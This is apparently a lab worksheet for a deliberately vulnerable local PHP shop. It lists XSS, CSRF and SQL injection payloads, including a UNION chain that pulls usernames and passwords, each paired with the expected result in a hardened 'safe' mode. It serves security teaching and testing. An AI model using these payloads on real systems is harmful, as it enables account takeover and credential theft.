# Attack Payloads & Steps (SecureShop)

> Run everything in **vulnerable** mode first (screenshots = success),
> then flip `config.php` to **safe** mode and repeat (screenshots = blocked).

---
## 1. Reflected XSS  — `index.php`
Open:
```
http://localhost:8000/index.php?q=<script>alert('Reflected XSS')</script>
```
**Vulnerable:** alert pops. **Safe:** payload shown as plain text, no alert.

## 2. Stored XSS — `product.php`
Go to a product, in the review box submit:
```
<script>alert('Stored XSS')</script>
```
Reload the product page -> alert fires every time (saved in DB).
**Safe:** review shows as text, no alert.

## 3. DOM-based XSS — `dom.php`
Open:
```
http://localhost:8000/dom.php#<img src=x onerror=alert('DOM XSS')>
```
**Vulnerable:** alert pops (handled purely in JS, never sent to server).
**Safe:** the string is printed literally.

## 4. CSRF — change email via external page
1. Login as `alice` in the browser (so the session cookie exists).
2. Open the attacker page `attacker/csrf_attack.html` in the SAME browser
   (e.g. double-click the file, or host it: `php -S localhost:9000` in the attacker folder).
3. It auto-submits to `profile.php` and silently changes alice's email to `hacker@evil.com`.
**Vulnerable:** email changes with no consent.
**Safe:** request rejected -> "CSRF token missing/invalid".

## 5. SQL Injection — EASY (login bypass) — `login.php`
Username:
```
' OR '1'='1' -- 
```
Password: anything.
**Vulnerable:** logs in as the first user (admin). **Safe:** "Invalid credentials".

## 6. SQL Injection — INTERMEDIATE (boolean-blind / error-based) — `product.php?id=`
Boolean test (page content differs -> field is injectable):
```
http://localhost:8000/product.php?id=1 AND 1=1      (product shows)
http://localhost:8000/product.php?id=1 AND 1=2      (product disappears)
```
Error-based (leaks via SQL error message):
```
http://localhost:8000/product.php?id=1 AND extractvalue(1,concat(0x7e,version()))
```

## 7. SQL Injection — ADVANCED (UNION chain) — `product.php?id=`
**Stage 1 — number of columns:**
```
http://localhost:8000/product.php?id=0 UNION SELECT 1,2,3,4-- -
```
(4 columns match: id,name,description,price)

**Stage 2 — database & table names:**
```
http://localhost:8000/product.php?id=0 UNION SELECT 1,table_name,database(),4 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Stage 3 — column names of `users`:**
```
http://localhost:8000/product.php?id=0 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -
```

**Stage 4 — extract the data (usernames + passwords):**
```
http://localhost:8000/product.php?id=0 UNION SELECT 1,concat(username,0x3a,password),3,4 FROM users-- -
```
**Safe:** all of the above return nothing / treated as id=0 (prepared statement + intval).

> Tip: if a URL with spaces misbehaves in the address bar, URL-encode spaces as `%20`.
